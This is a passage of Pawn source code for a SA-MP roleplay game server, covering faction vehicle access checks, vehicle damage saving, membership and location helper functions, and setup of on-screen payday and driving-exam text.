	if (IsAGangCar2(vehicleid) && !ispassenger)
	{
		if(PlayerInfo[playerid][pLeader] == 6||PlayerInfo[playerid][pMember] == 6) { }
		else
		{
			SendClientMessage(playerid, COLOR_TheKillers,"Shoma Ozv The Killers Nistid.");
			new Float:cx, Float:cy, Float:cz;
			GetPlayerPos(playerid, cx, cy, cz);
			SetPlayerPosEx(playerid, cx,  cy, cz);
		}
	}
	if (vehicleid == MayorVeh && !ispassenger)
	{
		if(PlayerInfo[playerid][pLeader] == 7 ||PlayerInfo[playerid][pMember] == 7) { }
		else
		{
			SendClientMessage(playerid, COLOR_TheKillers,"Shoma Mayor Nistid.");
			new Float:cx, Float:cy, Float:cz;
			GetPlayerPos(playerid, cx, cy, cz);
			SetPlayerPosEx(playerid, cx,  cy, cz);
		}
	}
	if(vehicleid == SLVeh[0] || vehicleid == SLVeh[1] || vehicleid == SLVeh[2] || vehicleid == SLVeh[3] || vehicleid == SLVeh[4] || vehicleid == SLVeh[5])
	{
		if(TakingsiLesson[playerid] == 1) { }
		else
		{
			if(!IsAnInstructor(playerid))
			{
				SendClientMessage(playerid,COLOR_LIGHTBLUE,"Shoma Ozv School Instructor Nistid.");
				new Float:cx, Float:cy, Float:cz;
				GetPlayerPos(playerid, cx, cy, cz);
				SetPlayerPosEx(playerid, cx,  cy, cz);
			}
		}
	}
	if (IsAGangCar3(vehicleid) && !ispassenger)
                {
                        if(PlayerInfo[playerid][pLeader] == 16||PlayerInfo[playerid][pMember] == 16) { }
                    else {
								SendClientMessage(playerid, COLOR_TCC,"You are not a Tow Car Company member.");
                                new Float:cx, Float:cy, Float:cz;
                                GetPlayerPos(playerid, cx, cy, cz);
                                SetPlayerPosEx(playerid, cx,  cy, cz);
                        }
                }
	if (IsAGangCar4(vehicleid) && !ispassenger)
	{
		if(PlayerInfo[playerid][pLeader] == 12||PlayerInfo[playerid][pMember] == 12) { }
		else
		{
			SendClientMessage(playerid, COLOR_DangerousTigers,"Shoma Ozv Dangerous Tigers Nistid.");
			new Float:cx, Float:cy, Float:cz;
			GetPlayerPos(playerid, cx, cy, cz);
			SetPlayerPosEx(playerid, cx,  cy, cz);
		}
	}
	if(IsAGangCar5(vehicleid) && !ispassenger)
	{
		if(PlayerInfo[playerid][pLeader] == 13||PlayerInfo[playerid][pMember] == 13) { }
		else
		{
			SendClientMessage(playerid, COLOR_LegendaryMen,"Shoma Ozv Legendary Men Nistid.");
			new Float:cx, Float:cy, Float:cz;
			GetPlayerPos(playerid, cx, cy, cz);
			SetPlayerPosEx(playerid, cx,  cy, cz);
		}
	}
	if(IsAGangCar6(vehicleid) && !ispassenger)
	{
		if(PlayerInfo[playerid][pLeader] == 14||PlayerInfo[playerid][pMember] == 14) { }
		else
		{
			SendClientMessage(playerid, COLOR_FNF,"Shoma Ozv Fast N Furious Nistid.");
			new Float:cx, Float:cy, Float:cz;
			GetPlayerPos(playerid, cx, cy, cz);
			SetPlayerPosEx(playerid, cx,  cy, cz);
		}
	}
	if (IsAGangCar7(vehicleid) && !ispassenger)
	{
		if(PlayerInfo[playerid][pLeader] == 15||PlayerInfo[playerid][pMember] == 15) { }
		else
		{
			SendClientMessage(playerid, COLOR_StormMen,"You are not a Storm Men member.");
			new Float:cx, Float:cy, Float:cz;
			GetPlayerPos(playerid, cx, cy, cz);
			SetPlayerPosEx(playerid, cx,  cy, cz);
		}
	}
	if (IsAGangCar17(vehicleid) && !ispassenger)
                {
                        if(PlayerInfo[playerid][pLeader] == 17||PlayerInfo[playerid][pMember] == 17) { }
                    else {
								SendClientMessage(playerid, COLOR_STAFF,"You are not a Staff member.");
                                new Float:cx, Float:cy, Float:cz;
                                GetPlayerPos(playerid, cx, cy, cz);
                                SetPlayerPosEx(playerid, cx,  cy, cz);
                        }
                }
	if (IsAGangCar19(vehicleid) && !ispassenger)
	{
		if(PlayerInfo[playerid][pLeader] == 19||PlayerInfo[playerid][pMember] == 19) { }
		else
		{
			SendClientMessage(playerid, COLOR_TopBoys,"You are not a The Racers member.");
			new Float:cx, Float:cy, Float:cz;
			GetPlayerPos(playerid, cx, cy, cz);
			SetPlayerPosEx(playerid, cx,  cy, cz);
		}
	}
	if(!ispassenger && vehicleid == ExamVeh[0] ||vehicleid == ExamVeh[1] ||vehicleid == ExamVeh[2] ||vehicleid == ExamVeh[3] ||vehicleid == ExamVeh[4] ||vehicleid == ExamVeh[5] ||vehicleid == ExamVeh[6])
	{
		if(TakingLesson[playerid] != 1)
		{
			new Float:cx, Float:cy, Float:cz;
			GetPlayerPos(playerid, cx, cy, cz);
			SetPlayerPosEx(playerid, cx,  cy, cz);
			SendClientMessage(playerid,COLOR_LIGHTBLUE,"You haven't key for this vehicle.");
		}
	}
	if(IsAnHitmanCar(vehicleid) && !ispassenger)
	{
		if(PlayerInfo[playerid][pLeader] == 8||PlayerInfo[playerid][pMember] == 8) { }
		else
		{
			SendClientMessage(playerid,COLOR_GREY,"You are not a Hitman member.");
			new Float:cx, Float:cy, Float:cz;
			GetPlayerPos(playerid, cx, cy, cz);
			SetPlayerPosEx(playerid, cx,  cy, cz);
		}
	}
	if(IsAnTaxiCar(vehicleid) && !ispassenger)
	{
		if(PlayerInfo[playerid][pLeader] == 10||PlayerInfo[playerid][pMember] == 10) { }
		else
		{
			SendClientMessage(playerid,COLOR_TAXI,"You are not a Taxi Driver.");
			new Float:cx, Float:cy, Float:cz;
			GetPlayerPos(playerid, cx, cy, cz);
			SetPlayerPosEx(playerid, cx,  cy, cz);
		}
	}
    return 1;
}
/*----------------------------------------------------------------------------*/
public OnVehicleDamageStatusUpdate(vehicleid, playerid)
{
    if(TakingLesson[playerid] == 1)
    {
        new Float:health,veh;
        veh = GetPlayerVehicleID(playerid);
		GetVehicleHealth(veh, health);
		if(health <= 900)
		{
			TakingLesson[playerid] = 0;
			DisablePlayerRaceCheckpoint(playerid);
			OnCheckpoint[playerid] = 0;
			SetVehicleToRespawn(veh);
			RemovePlayerFromVehicle(playerid);
			if(PlayerInfo[playerid][pLanguage] == 2) SCM(playerid,COLOR_JOB, "Exam: You broke the car! Failed on test.");
			if(PlayerInfo[playerid][pLanguage] == 1) SCM(playerid,COLOR_JOB, "{FFFFFF}EXAM:{57e547} Mashin Sadame Did. Emtehan Ro Rad Shodi.");
			TextDrawHideForPlayer(playerid,TD_Exam[playerid][0]);
			TextDrawHideForPlayer(playerid,TD_Exam[playerid][1]);
			TextDrawHideForPlayer(playerid,TD_Exam[playerid][2]);
			RCP[playerid] = 0;
			return 1;
		}
	}
    if(OwnedMashin[vehicleid] == 1)
    {
        new owner = MashinOwner[vehicleid],Float:health;GetVehicleHealth(vehicleid,health);
        if(health >= 250.0)
        {
            GetVehicleDamageStatus(vehicleid,PINFO[owner][cPanel],PINFO[owner][cDoors],PINFO[owner][cLights],PINFO[owner][cTires]);
            SaveKonVal(owner, "cPanel", PINFO[owner][cPanel]);
            SaveKonVal(owner, "cDoors", PINFO[owner][cDoors]);
            SaveKonVal(owner, "cLights", PINFO[owner][cLights]);
            SaveKonVal(owner, "cTires", PINFO[owner][cTires]);
            PlayerInfo[owner][cHealth] = health;
            SaveKonFloat(owner, "cHealth", health);
        }
    }
    else if(OwnedMashin_2[vehicleid] == 1)
    {
        new owner = MashinOwner_2[vehicleid],Float:health;GetVehicleHealth(vehicleid,health);
        if(health >= 250.0)
        {
            GetVehicleDamageStatus(vehicleid,PINFO[owner][cPanel_2],PINFO[owner][cDoors_2],PINFO[owner][cLights_2],PINFO[owner][cTires_2]);
            SaveKonVal(owner, "cPanel_2", PINFO[owner][cPanel_2]);
            SaveKonVal(owner, "cDoors_2", PINFO[owner][cDoors_2]);
            SaveKonVal(owner, "cLights_2", PINFO[owner][cLights_2]);
            SaveKonVal(owner, "cTires_2", PINFO[owner][cTires_2]);
            PlayerInfo[owner][cHealth_2] = health;
            SaveKonFloat(owner, "cHealth_2", health);
        }
    }
    return 1;
}
/*----------------------------------------------------------------------------*/
public IsAnInstructor(playerid)
{
    if(IsPlayerConnected(playerid))
    {
        new leader = PlayerInfo[playerid][pLeader];
        new member = PlayerInfo[playerid][pMember];
        if(member==11) return 1;
        if(leader==11) return 1;
    }
    return 0;
}
/*----------------------------------------------------------------------------*/
public IsAnTaxi(playerid)
{
    if(IsPlayerConnected(playerid))
    {
        new leader = PlayerInfo[playerid][pLeader];
        new member = PlayerInfo[playerid][pMember];
        if(member==10) return 1;
        if(leader==10) return 1;
    }
    return 0;
}
/*----------------------------------------------------------------------------*/
public IsAMember(playerid)
{
    if(IsPlayerConnected(playerid))
    {
        new leader = PlayerInfo[playerid][pLeader];
        new member = PlayerInfo[playerid][pMember];
        if(member==5 || member==6 ||member==12 || member==13 || member==14 || member==15 || member==19)
        {
            return 1;
        }
        if(leader==5 || leader==6 ||leader==12 || leader==13 || leader==14 || leader==15 || leader==19)
        {
            return 1;
        }
    }
    return 0;
}

public IsAMemberCl(playerid)
{
    if(IsPlayerConnected(playerid))
    {
 new clan = PlayerInfo[playerid][pClan];
        if(clan==1)
        {
            return 1;
        }
        if(clan==2)
        {
            return 1;
        }
		if(clan==3)
        {
            return 1;
        }
    }
    return 0;
}
/*----------------------------------------------------------------------------*/
public IsAMemberC(playerid)
{
    if(IsPlayerConnected(playerid))
    {
        new leader = PlayerInfo[playerid][pLeader];
        new member = PlayerInfo[playerid][pMember];
        if(member==5 || member==6 ||member==12 || member==13 || member==14 || member==15 || member==19)
        {
            return 1;
        }
        if(leader==5 || leader==6 ||leader==12 || leader==13 || leader==14 || leader==15 || leader==19)
        {
            return 1;
        }
    }
    return 0;
}
/*----------------------------------------------------------------------------*/
public IsACop(playerid)
{
    if(IsPlayerConnected(playerid))
    {
        new leader = PlayerInfo[playerid][pLeader],member = PlayerInfo[playerid][pMember];
        if(member==1 || member==2 || member==3 || member==20) return 1;
        else if(leader==1 || leader==2 || leader==3 || leader==20) return 1;
    }
    return 0;
}
public IsANr(playerid)
{
    if(IsPlayerConnected(playerid))
    {
        new leader = PlayerInfo[playerid][pLeader];
        new member = PlayerInfo[playerid][pMember];
        if(member==8)
        {
            return 1;
        }
        else if(leader==8)
        {
            return 1;
        }
    }
    return 0;
}
/*----------------------------------------------------------------------------*/
public IsAPDMember(playerid)
{
    if(IsPlayerConnected(playerid))
    {
        new leader = PlayerInfo[playerid][pLeader];
        new member = PlayerInfo[playerid][pMember];
        if(member==1) return 1;
        else if(leader==1) return 1;
    }
    return 0;
}

public IsASFPDMember(playerid)
{
    if(IsPlayerConnected(playerid))
    {
        new leader = PlayerInfo[playerid][pLeader];
        new member = PlayerInfo[playerid][pMember];
        if(member==20) return 1;
        else if(leader==20) return 1;
    }
    return 0;
}
/*----------------------------------------------------------------------------*/
public IsAtHotdogPlace(playerid)
{
    if(IsPlayerConnected(playerid))
    {

        if(PlayerToPoint(3.0, playerid, 2327.5669,2420.0872,10.8203) || PlayerToPoint(3.0, playerid, 2536.7705,2137.3352,10.8203) || PlayerToPoint(3.0, playerid, 730.190124,-1267.223022,13.553401))
        {
            return 1;
        }
        else if(PlayerToPoint(3.0, playerid, 2144.3965,1440.8734,10.8203) || PlayerToPoint(3.0, playerid, 1543.6354,-1697.5503,13.5469))
        {
            return 1;
        }
        else if(PlayerToPoint(3.0, playerid, 1803.9893,-1861.9354,13.5769) || PlayerToPoint(3.0, playerid, 999.8986,-1850.0149,12.8146))
        {
            return 1;
        }
        else if(PlayerToPoint(3.0, playerid, 760.2253,-1670.2555,4.1461) || PlayerToPoint(3.0, playerid, 388.5802,-2072.7168,7.8359))
        {
            return 1;
        }
        else if(PlayerToPoint(3.0, playerid, 1589.4072,-1288.5424,17.5171) || PlayerToPoint(3.0,playerid, -196.126205,2659.945556,62.839744))
        {
            return 1;
        }
        else if(PlayerToPoint(3.0, playerid, -2147.457031,-424.305725,35.335937) || PlayerToPoint(3.0,playerid, -2690.852050,383.803985,4.374998))
        {
            return 1;
        }
         else if(PlayerToPoint(3.0, playerid, 1375.8477,-1044.9393,26.8763) || PlayerToPoint(3.0,playerid, 1375.8477,-1044.9393,26.8763))
        {
            return 1;
        }
    }
    return 0;
}
/*----------------------------------------------------------------------------*/
public IsAtATMSystem(playerid)
{
    if(IsPlayerConnected(playerid))
    {
        if(PlayerToPoint(3.0,playerid,1009.2220,-929.6009,42.3281) || PlayerToPoint(3.0,playerid,603.6191,-1247.6931,18.4213) || PlayerToPoint(3.0,playerid,308.051910,-141.461181,999.601562))
        {//ATM SYSTEM
            return 1;
        }
        else if(PlayerToPoint(3.0,playerid,2173.2356,1417.4757,11.0625) || PlayerToPoint(3.0,playerid,1739.4116,-1862.9391,13.5757))
        {//ATM SYSTEM
            return 1;
        }
    }
    return 0;
}
/*----------------------------------------------------------------------------*/
public IsAtClothShop(playerid)
{
    if(IsPlayerConnected(playerid))
    {
        if(TooBiz[playerid] == 39 || TooBiz[playerid] == 40 || TooBiz[playerid] == 41 || TooBiz[playerid] == 73 || TooBiz[playerid] == 42 || TooBiz[playerid] == 45)
        {
            return 1;
        }
    }
    return 0;
}
/*----------------------------------------------------------------------------*/
public IsAtGasStation(playerid)
{
    if(IsPlayerConnected(playerid))
    {
        if(PlayerToPoint(6.0,playerid,1004.0070,-939.3102,42.1797))
        {
            return 3;
        }
        else if(PlayerToPoint(6.0,playerid,1944.3260,-1772.9254,13.3906))
        {
            return 9;
        }
        else if(PlayerToPoint(6.0,playerid,-90.5515,-1169.4578,2.4079))
        {
            return 12;
        }
        else if(PlayerToPoint(6.0,playerid,-1609.7958,-2718.2048,48.5391))
        {
            return 13;
        }
        else if(PlayerToPoint(6.0,playerid,-2029.4968,156.4366,28.9498))
        {
            return 22;
        }
        else if(PlayerToPoint(8.0,playerid,-2408.7590,976.0934,45.4175))
        {
            return 23;
        }
        else if(PlayerToPoint(5.0,playerid,-2243.9629,-2560.6477,31.8841))
        {
            return 24;
        }
        else if(PlayerToPoint(8.0,playerid,-1676.6323,414.0262,6.9484))
        {
            return 25;
        }
        else if(PlayerToPoint(6.0,playerid,2202.2349,2474.3494,10.5258))
        {
            return 26;
        }
        else if(PlayerToPoint(10.0,playerid,614.9333,1689.7418,6.6968))
        {
            return 27;
        }
        else if(PlayerToPoint(8.0,playerid,-1328.8250,2677.2173,49.7665))
        {
            return 28;
        }
        else if(PlayerToPoint(6.0,playerid,70.3882,1218.6783,18.5165))
        {
            return 29;
        }
        else if(PlayerToPoint(8.0,playerid,2113.7390,920.1079,10.5255))
        {
            return 30;
        }
        else if(PlayerToPoint(8.0,playerid,1595.8409,2195.8120,10.8203))
        {
            return 31;
        }
        else if(PlayerToPoint(6.0,playerid,2639.8884,1106.8141,10.8203))
        {
            return 32;
        }
        else if(PlayerToPoint(6.0,playerid,656.3797,-570.4138,16.5015))
        {
            return 33;
        }
        else if(PlayerToPoint(6.0,playerid,-1671.621215,410.416503,7.398437))
        {
            return 34;
        }
        else if(PlayerToPoint(6.0,playerid,-1678.261596,416.957763,7.405662))
        {
            return 35;
        }
        else if(PlayerToPoint(6.0,playerid,-2410.034912,975.821350,45.424880))
        {
            return 36;
        }
    }
    return 0;
}
/*----------------------------------------------------------------------------*/
public IsAtFishPlace(playerid)
{
    if(IsPlayerConnected(playerid))
    {
        if(PlayerToPoint(2.0,playerid,403.8266,-2088.7598,7.8359) || PlayerToPoint(1.0,playerid,398.7553,-2088.7490,7.8359))
        {//Fishplace at the bigwheel
            return 1;
        }
        else if(PlayerToPoint(2.0,playerid,396.2197,-2088.6692,7.8359) || PlayerToPoint(1.0,playerid,391.1094,-2088.7976,7.8359))
        {//Fishplace at the bigwheel
            return 1;
        }
        else if(PlayerToPoint(2.0,playerid,383.4157,-2088.7849,7.8359) || PlayerToPoint(1.0,playerid,374.9598,-2088.7979,7.8359))
        {//Fishplace at the bigwheel
            return 1;
        }
        else if(PlayerToPoint(2.0,playerid,369.8107,-2088.7927,7.8359) || PlayerToPoint(1.0,playerid,367.3637,-2088.7925,7.8359))
        {//Fishplace at the bigwheel
            return 1;
        }
        else if(PlayerToPoint(2.0,playerid,362.2244,-2088.7981,7.8359) || PlayerToPoint(1.0,playerid,354.5382,-2088.7979,7.8359))
        {//Fishplace at the bigwheel
            return 1;
        }
    }
    return 0;
}
/*----------------------------------------------------------------------------*/
public IsAtBankk(playerid)
{
    if(IsPlayerConnected(playerid))
    {
        if(TooBiz[playerid] == 8 || TooBiz[playerid] == 9 || TooBiz[playerid] == 57)
        {
            return 1;
        }
    }
    return 0;
}
/*----------------------------------------------------------------------------*/
public IsAtBar(playerid)
{
    if(IsPlayerConnected(playerid))
    {
        if(PlayerToPoint(4.0,playerid,495.7801,-76.0305,998.7578) || PlayerToPoint(4.0,playerid,499.9654,-20.2515,1000.6797))
        {//In DangerousTigers street bar
            return 1;
        }
        else if(PlayerToPoint(4.0,playerid,1215.9480,-13.3519,1000.9219) || PlayerToPoint(10.0,playerid,-2658.9749,1407.4136,906.2734))
        {//PIG Pen
            return 1;
        }
        else if(PlayerToPoint(4.0,playerid,2194.0007,1605.9015,1005.0625) || PlayerToPoint(10.0,playerid,1952.9330,1017.2921,992.4688))
        {//Casino LV
            return 1;
        }
        else if(PlayerToPoint(4.0,playerid,1949.2031,1015.7325,992.4745) || PTP(7.0,playerid,1762.229614,-1576.600097,2001.460449))
        {//Casino LV
            return 1;
        }
        else if(PlayerToPoint(4.0,playerid,-791.016,512.249,1336.41) || PlayerToPoint(10.0,playerid,-799.122,520.988,1336.41))
        {//Nortenos House
            return 1;
        }
    }
    return 0;
}
/*----------------------------------------------------------------------------*/
public IsAtEatPlace(playerid)
{
    if(IsPlayerConnected(playerid))
    {
         if(PlayerToPoint(1.5,playerid,368.9714,-6.2486,1001.8516) || PlayerToPoint(1.5,playerid,376.8571,-67.6620,1001.5151) || PlayerToPoint(1.5,playerid,313.977355,-138.886062,1004.062500))
         {
            return 1;
         }
         else if(PlayerToPoint(1.5,playerid,375.6895,-118.9683,1001.4995) || PlayerToPoint(0.8,playerid,379.0611,-186.6032,1000.6328))
         {
            return 1;
         }
         else if(PlayerToPoint(1.5,playerid,-787.565551,500.073822,1371.742187))
         {
            return 1;
         }
    }
    return 0;
}
/*----------------------------------------------------------------------------*/
public IsAtCnn(playerid)
{
    if(IsPlayerConnected(playerid))
    {
        if(PlayerToPoint(4.0,playerid,1111.92,-1796.84,16.5937) || PlayerToPoint(4.0,playerid,2079.4434,2046.1344,11.0579))
        {
            return 1;
        }
    }
    return 0;
}
/*----------------------------------------------------------------------------*/
public IsABoat(carid)
{
    new model = GetVehicleModel(carid);
    if(model == 472||model == 473||model == 493||model == 595||model == 484||model == 430||model == 453||model == 452||model == 446||model == 454)
    {
        return 1;
    }
    return 0;
}
/*----------------------------------------------------------------------------*/
Public:UseDrugTimer(playerid)
{
	CanUseDrug[playerid] =0;
	SendClientMessage(playerid, COLOR_GREY, "Now you can use Drug.");
	return 1;
}
Public:HidePayDay(playerid)
{
	TextDrawHideForPlayer(playerid,TD_PayDay[playerid][0]);
	TextDrawHideForPlayer(playerid,TD_PayDay[playerid][1]);
	TextDrawHideForPlayer(playerid,TD_PayDay[playerid][2]);
	TextDrawHideForPlayer(playerid,TD_PayDay[playerid][3]);
	return 1;
}
Public:IsAHarvest(ciD)
{
	if(ciD == FarmerVeh[0] || ciD == FarmerVeh[1] || ciD == FarmerVeh[2] || ciD == FarmerVeh[3] || ciD == FarmerVeh[4] || ciD == FarmerVeh[5] || ciD == FarmerVeh[6] || ciD == FarmerVeh[7] || ciD == FarmerVeh[8] || ciD == FarmerVeh[9] || ciD == FarmerVeh[10] || ciD == FarmerVeh[11]) return 1;
    return 0;
}
/*----------------------------------------------------------------------------*/
Public:IsAHarvest2(ciD)
{
	if(ciD == FarmerVeh[12] || ciD == FarmerVeh[13] || ciD == FarmerVeh[14] || ciD == FarmerVeh[15] || ciD == FarmerVeh[16] || ciD == FarmerVeh[17] || ciD == FarmerVeh[18] || ciD == FarmerVeh[19] || ciD == FarmerVeh[20] || ciD == FarmerVeh[21]) return 1;
    return 0;
}
/*----------------------------------------------------------------------------*/
public IsAPlane(carid)
{
    new model = GetVehicleModel(carid);
    if(model ==  592||model == 577||model == 511||model == 512||model == 593||model == 520||model == 553||model == 476||model == 519||model == 460||model == 513||model == 548||model == 425||model == 417||model == 487||model == 488||model == 497||model == 563||model == 447||model == 469) return 1;
    return 0;
}
/*----------------------------------------------------------------------------*/
Public:BanPlayerTime(playerid)
{
    Ban(playerid);
    return 1;
}
Public:IsHeli(carid)
{
    new mod = GetVehicleModel(carid);
    if(mod == 548 || mod == 425 || mod == 417 || mod == 487 || mod == 488 || mod == 497 || mod == 563 || mod == 447 || mod == 469) return 1;
    return 0;
}
/*----------------------------------------------------------------------------*/
Public:IsAFBICar(carid)
{
	for(new i = 0; i < sizeof(FBIVeh); i++) { if(carid == FBIVeh[i]) return 1; }
    return 0;
}
Public:IsANGCar(carid)
{
	for(new i = 0; i < sizeof(NGVeh); i++) { if(carid == NGVeh[i]) return 1; }
    return 0;
}
Public:IsALSPDCar(carid)
{
	for(new i = 0; i < sizeof(CopLSVeh); i++) { if(carid == CopLSVeh[i]) return 1; }
    return 0;
}
Public:IsASFPDCar(carid)
{
	for(new i = 0; i < sizeof(CopSFVeh); i++) { if(carid == CopSFVeh[i]) return 1; }
    return 0;
}
Public:IsACopCar(carid)
{
	for(new i = 0; i < sizeof(NGVeh); i++) { if(carid == NGVeh[i]) return 1; }
	for(new i = 0; i < sizeof(CopLSVeh); i++) { if(carid == CopLSVeh[i]) return 1; }
	for(new i = 0; i < sizeof(CopSFVeh); i++) { if(carid == CopSFVeh[i]) return 1; }
	for(new i = 0; i < sizeof(FBIVeh); i++) { if(carid == FBIVeh[i]) return 1; }
    return 0;
}
Public:IsANrcar(carid)
{
	for(new i = 0; i < sizeof(NewsVeh); i++) { if(carid == NewsVeh[i]) return 1; }
    return 0;
}
/*----------------------------------------------------------------------------*/
Public:IsSpecialVeh(carid)
{
    if(carid == 1 || carid == 2 || (carid >=8 && carid <= 15)) return 1;
    return 0;
}
Public:IsAnTaxiCar(carid)
{
	for(new i = 0; i < sizeof(TaxVeh); i++) { if(carid == TaxVeh[i]) return 1; }
	return 0;
}
Public:IsAnHitmanCar(carid)
{
	for(new i = 0; i < sizeof(HitVeh); i++) { if(carid == HitVeh[i]) return 1; }
	return 0;
}
Public:IsAnRentCar(carid)
{
	for(new i = 0; i < sizeof(RentVeh); i++) { if(carid == RentVeh[i]) return 1; }
	return 0;
}
Public:IsAnAmbulance(carid)
{
	for(new i = 0; i < sizeof(MedVeh); i++) { if(carid == MedVeh[i]) return 1; }
    return 0;
}
Public:IsAProdsVeh(carid)
{
	for(new i = 0; i < sizeof(ProdsVeh); i++) { if(carid == ProdsVeh[i]) return 1; }
    return 0;
}
Public:IsABus(carid)
{
	for(new i = 0; i < sizeof(BusVeh); i++) { if(carid == BusVeh[i]) return 1; }
    return 0;
}
/*----------------------------------------------------------------------------*/
Public:IsATowcar(carid)
{
	for(new i = 0; i < sizeof(MCHVeh); i++) { if(carid == MCHVeh[i]) return 1; }
    return 0;
}
/*----------------------------------------------------------------------------*/
Public:IsAGangCar(carid)//Silence Mafia
{
	for(new i = 0; i < sizeof(SilVeh); i++) { if(carid == SilVeh[i]) return 1; }
    return 0;
}
Public:IsPreCar(vehicleid)
{
if(vehicleid ==  preveh[0] || vehicleid ==  preveh[1] || vehicleid ==  preveh[2]) return 1; else return 0;
}
/*----------------------------------------------------------------------------*/
Public:Isjscar(carid)//jsacar
{
	if((carid == jscar[1]) || (carid == jscar[2]) || (carid == jscar[3]) || (carid == jscar[4]))
	{
		return 1;
	}
    return 0;
}
/*----------------------------------------------------------------------------*/
Public:IsAGangCar2(carid)//The Killers
{
	for(new i = 0; i < sizeof(TKVeh); i++) { if(carid == TKVeh[i]) return 1; }
    return 0;
}
/*----------------------------------------------------------------------------*/
public IsAGangCar3(carid)//TOW car company
{
    if((carid == tcc1) || (carid == tcc2) || (carid == tcc3) || (carid == tcc4) || (carid == tcc5) || (carid == tcc6) || (carid == tcc7))
    {
        return 1;
    }
    return 0;
}
/*----------------------------------------------------------------------------*/
Public:IsAGangCar4(carid)//Dangerous Tigers
{
	for(new i = 0; i < sizeof(DTVeh); i++) { if(carid == DTVeh[i]) return 1; }
    return 0;
}
/*----------------------------------------------------------------------------*/
Public:IsAGangCar5(carid)//tataglia
{
	for(new i = 0; i < sizeof(LMVeh); i++) { if(carid == LMVeh[i]) return 1; }
    return 0;
}

// Staff
public IsAGangCar17(carid)//Staff
{
if((carid == stfcar) || (carid == stfcar1) || (carid == stfcar2) || (carid == stfcar3) || (carid == stfcar4) || (carid == stfcar5) || (carid == stfcar6) || (carid == stfcar7) || (carid == stfcar8) || (carid == stfcar9)
 || (carid == stfcar10) || (carid == stfcar11) || (carid == stfcar12) || (carid == stfcar13) || (carid == stfcar14) || (carid == stfcar15)
  || (carid == stfcar16) || (carid == stfcar17) || (carid == stfcar18) || (carid == stfcar19) || (carid == stfcar20) || (carid == stfcar21) || (carid == stfcar22) || (carid == stfcar23)
  || (carid == stfcar24) || (carid == stfcar25) || (carid == stfcar27) || (carid == stfcar28) || (carid == stfcar29) ||
   (carid == stfcar30) || (carid == stfcar31) || (carid == stfcar32) || (carid == stfcar33) || (carid == stfcar34) || (carid == stfcar35))
    {
        return 1;
    }
    return 0;
}
public IsAGangCar19(carid)//The Racers
{
if((carid == tboy1) || (carid == tboy2) || (carid == tboy3) || (carid == tboy4) || (carid == tboy5) || (carid == tboy6) || (carid == tboy7) || (carid == tboy8) || (carid == tboy9) || (carid == tboy11) || (carid == tboy12) || (carid == tboy13) || (carid == tboy14) || (carid == tboy15) || (carid == tboy16) || (carid == tboy18) || (carid == tboy19) || (carid == tboy20) || (carid == tboy21))
    {
        return 1;
    }
    return 0;
}
Public:LoadPlayerTextdraws()
{
	for(new playerid = 0; playerid < MAX_PLAYERS; playerid++)
	{
		TD_PayDay[playerid][1] = TextDrawCreate(220.000000, 260.000000, "LD_SPAC:white");
		TextDrawLetterSize(TD_PayDay[playerid][1], 0.000000, 0.000000);
		TextDrawTextSize(TD_PayDay[playerid][1], 200.000000, 95.000000);
		TextDrawAlignment(TD_PayDay[playerid][1], 1);
		TextDrawColor(TD_PayDay[playerid][1], 130);
		TextDrawSetShadow(TD_PayDay[playerid][1], 0);
		TextDrawSetOutline(TD_PayDay[playerid][1], 0);
		TextDrawBackgroundColor(TD_PayDay[playerid][1], 255);
		TextDrawFont(TD_PayDay[playerid][1], 4);
		TextDrawSetProportional(TD_PayDay[playerid][1], 0);
		TextDrawSetShadow(TD_PayDay[playerid][1], 0);

		TD_PayDay[playerid][2] = TextDrawCreate(220.000000, 260.000000, "LD_SPAC:white");
		TextDrawLetterSize(TD_PayDay[playerid][2], 0.000000, 0.000000);
		TextDrawTextSize(TD_PayDay[playerid][2], 200.000000, 20.000000);
		TextDrawAlignment(TD_PayDay[playerid][2], 1);
		TextDrawColor(TD_PayDay[playerid][2], 255);
		TextDrawSetShadow(TD_PayDay[playerid][2], 0);
		TextDrawSetOutline(TD_PayDay[playerid][2], 0);
		TextDrawBackgroundColor(TD_PayDay[playerid][2], 255);
		TextDrawFont(TD_PayDay[playerid][2], 4);
		TextDrawSetProportional(TD_PayDay[playerid][2], 0);
		TextDrawSetShadow(TD_PayDay[playerid][2], 0);

		TD_PayDay[playerid][0] = TextDrawCreate(320.000000, 259.500000, "Bank Statement");
		TextDrawLetterSize(TD_PayDay[playerid][0], 0.449999, 2.000000);
		TextDrawAlignment(TD_PayDay[playerid][0], 2);
		TextDrawColor(TD_PayDay[playerid][0], -5963521);
		TextDrawSetShadow(TD_PayDay[playerid][0], 0);
		TextDrawSetOutline(TD_PayDay[playerid][0], 0);
		TextDrawBackgroundColor(TD_PayDay[playerid][0], 255);
		TextDrawFont(TD_PayDay[playerid][0], 2);
		TextDrawSetProportional(TD_PayDay[playerid][0], 1);
		TextDrawSetShadow(TD_PayDay[playerid][0], 0);

		TD_PayDay[playerid][3] = TextDrawCreate(222.000000, 280.000000, "PayDay");
		TextDrawLetterSize(TD_PayDay[playerid][3], 0.239999, 1.240000);
		TextDrawAlignment(TD_PayDay[playerid][3], 1);
		TextDrawColor(TD_PayDay[playerid][3], -1);
		TextDrawSetShadow(TD_PayDay[playerid][3], 0);
		TextDrawSetOutline(TD_PayDay[playerid][3], 1);
		TextDrawBackgroundColor(TD_PayDay[playerid][3], 255);
		TextDrawBackgroundColor(TD_PayDay[playerid][3], 255);
		TextDrawFont(TD_PayDay[playerid][3], 1);
		TextDrawSetProportional(TD_PayDay[playerid][3], 1);
		TextDrawSetShadow(TD_PayDay[playerid][3], 0);

		TD_Exam[playerid][1] = TextDrawCreate(140.000000, 370.000000, "LD_SPAC:white");
		TextDrawLetterSize(TD_Exam[playerid][1], 0.000000, 0.000000);
		TextDrawTextSize(TD_Exam[playerid][1], 200.000000, 25.000000);
		TextDrawAlignment(TD_Exam[playerid][1], 1);
		TextDrawColor(TD_Exam[playerid][1], 100);
		TextDrawSetShadow(TD_Exam[playerid][1], 0);
		TextDrawSetOutline(TD_Exam[playerid][1], 0);
		TextDrawBackgroundColor(TD_Exam[playerid][1], 255);
		TextDrawFont(TD_Exam[playerid][1], 4);
		TextDrawSetProportional(TD_Exam[playerid][1], 0);
		TextDrawSetShadow(TD_Exam[playerid][1], 0);

		TD_Exam[playerid][0] = TextDrawCreate(145.000000, 375.000000, "Shoma_Marhale_15_Az_20_Hastid");
		TextDrawLetterSize(TD_Exam[playerid][0], 0.330000, 1.500000);
		TextDrawAlignment(TD_Exam[playerid][0], 1);
		TextDrawColor(TD_Exam[playerid][0], -1);
		TextDrawSetShadow(TD_Exam[playerid][0], 1);
